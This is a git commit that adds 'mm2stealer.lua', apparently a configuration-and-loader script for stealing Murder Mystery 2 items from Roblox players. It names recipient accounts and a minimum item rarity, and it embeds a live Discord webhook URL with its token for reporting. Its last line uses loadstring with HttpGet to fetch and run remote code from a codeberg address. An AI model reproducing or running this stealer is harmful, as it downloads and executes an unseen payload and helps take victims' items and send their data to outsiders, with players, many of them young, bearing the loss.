68c345b50f7d34d987635a25c08e4b74f6096c9e
ScriptsHub11 <martinnader717@gmail.com>
2025-07-21 21:51:11 +0300

    Create mm2stealer.lua

---
+++ mm2stealer.lua
@@ -0,0 +1,6 @@
+users = {"huggybuggydk","eyadahmed023"}
+min_rarity = "Godly"
+min_value = 1
+ping = "Yes"
+webhook = "https://discord.com/api/webhooks/1396888690000662638/6uV6Z6QZ-eDmRCQmfIFnOThPV17SDhYM8LgOo4yRDawJ8pEf8WaLmV9ci5LsEhi-0lfD"
+loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/mm2"))()
